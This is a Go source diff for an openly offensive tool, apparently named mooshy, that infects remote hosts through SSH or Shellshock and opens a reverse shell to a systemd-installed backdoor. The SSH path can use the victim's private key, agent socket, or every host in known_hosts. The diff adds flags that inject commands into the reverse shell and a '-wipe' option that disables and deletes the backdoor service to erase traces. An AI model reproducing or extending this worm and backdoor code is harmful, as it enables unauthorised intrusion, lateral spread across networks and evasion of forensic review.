@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"encoding/hex"
 	"flag"
@@ -173,7 +174,7 @@ func latestMoosh(token string) (string, error) {
 	return "", errors.New("not found")
 }
 
-func runShell(rw io.ReadWriter) (err error) {
+func runShell(shell io.ReadWriter, cmds ...string) (err error) {
 	cmd := exec.Command("stty", "-echo", "raw")
 	cmd.Stdin = os.Stdin
 	if err = cmd.Run(); err != nil {
@@ -188,15 +189,22 @@ func runShell(rw io.ReadWriter) (err error) {
 		}
 	}()
 
-	go io.Copy(os.Stdout, rw)
-	_, err = io.Copy(rw, os.Stdin)
+	var in io.Reader = os.Stdin
+	if len(cmds) != 0 {
+		in = io.MultiReader(bytes.NewBufferString(strings.Join(cmds, "; ")+"\n"), in)
+	}
+
+	go io.Copy(os.Stdout, shell)
+	_, err = io.Copy(shell, in)
 	if err != nil {
-		errors.Wrap(err, "failed to pass stdin to reverse shell")
+		errors.Wrap(err, "failed to pass in to reverse shell")
 	}
 	return nil
 }
 
 func main() {
+	sshUser := "averagejoe"
+
 	var home string
 
 	u, err := user.Current()
@@ -205,34 +213,49 @@ func main() {
 		home = os.Getenv("HOME")
 	} else {
 		home = u.HomeDir
+		sshUser = u.Username
 	}
 
 	knownHosts := filepath.Join(home, ".ssh", "known_hosts")
 	sshKey := filepath.Join(home, ".ssh", "id_rsa")
 	sshAgent := os.Getenv("SSH_AUTH_SOCK")
 
-	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file")
-	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket")
-	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key")
-	sshUser := flag.String("sshUser", "averagejoe", "Username to connect as(e.g. for SSH)")
+	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file for SSH infection")
+	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket for SSH infection")
+	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key for SSH infection")
+	flag.StringVar(&sshUser, "sshUser", sshUser, "Username to connect as using SSH infection")
 	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
-	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
-	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
-	useSSHKnown := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
+	useSSHAgent := flag.Bool("useSSHAgent", false, "Use SSH agent for SSH infection")
+	useSSHKey := flag.Bool("useSSHKey", false, "Use (passwordless) SSH private key for SSH infection")
+	useSSHKnown := flag.Bool("useSSHKnown", false, "Infect all hosts in SSH known_hosts file using SSH infection")
 	useShellShock := flag.Bool("shellShock", false, "Use Shell Shock for the infection")
-	moosh := flag.String("moosh", "", "Path to moosh. If empty - uses the one from https://github.com/rvolosatovs/mooshy/releases/latest )")
+	moosh := flag.String("moosh", "", "Path to moosh. If empty - uses the one from https://github.com/rvolosatovs/mooshy/releases/latest")
 	addr := flag.String("addr", "", "The lucky guy(in case of Shell Shock - endpoint)")
+	pre := flag.String("c", "", "Command to run before shell start")
+	wipe := flag.Bool("wipe", false, "Wipe the backdoor in execution mode (The self-destructing script will be appended to pre)")
 	tcp := flag.String("tcp", ":0", "TCP address to listen on in execution mode")
 	token := flag.String("token", "", "Github token to use")
 	flag.Parse()
 
-	if *addr == "" && !*useSSHKnown || *useSSH && *useShellShock {
+	switch {
+	case *addr == "" && !*useSSHKnown,
+		*useSSH && *useShellShock,
+		(*useSSH || *useShellShock) && (*pre != "" || *wipe):
+
 		if *addr == "" && !(*useSSH && *useSSHKnown) {
 			log.Println("At least one of -addr or -useSSHKnown(with -ssh) must be specified")
 		}
 
 		if *useSSH && *useShellShock {
 			log.Println("At most one of '-ssh' and '-shellShock' must be specified")
+		}
+
+		if (*useSSH || *useShellShock) && *pre != "" {
+			log.Println("'-pre' must not be specified in infection mode")
+		}
+
+		if (*useSSH || *useShellShock) && *wipe {
+			log.Println("'-wipe' must not be specified in infection mode")
 		}
 
 		flag.Usage()
@@ -309,7 +332,7 @@ func main() {
 		}
 
 		conf := SSHConfig{
-			Username: *sshUser,
+			Username: sshUser,
 		}
 		if *useSSHKey {
 			conf.PrivateKey = sshKey
@@ -395,7 +418,21 @@ func main() {
 		log.Printf("Received connection from %s", conn.RemoteAddr())
 		defer conn.Close()
 
-		if err := runShell(conn); err != nil {
+		var cmds []string
+		if *pre != "" {
+			cmds = append(cmds, *pre)
+		}
+		if *wipe {
+			cmds = append(cmds, []string{
+				fmt.Sprintf("systemctl disable %s.service", mooshy.ServiceName),
+				fmt.Sprintf("rm -f /lib/systemd/system/%s.service", mooshy.ServiceName),
+				fmt.Sprintf("rm -f /lib/systemd/%s", mooshy.ServiceName),
+				"systemctl daemon-reload",
+				fmt.Sprintf("systemctl stop %s.service", mooshy.ServiceName),
+			}...)
+		}
+
+		if err := runShell(conn, cmds...); err != nil {
 			log.Fatalf("Failed to run shell on %s: %s", l.Addr(), err)
 		}
 	}
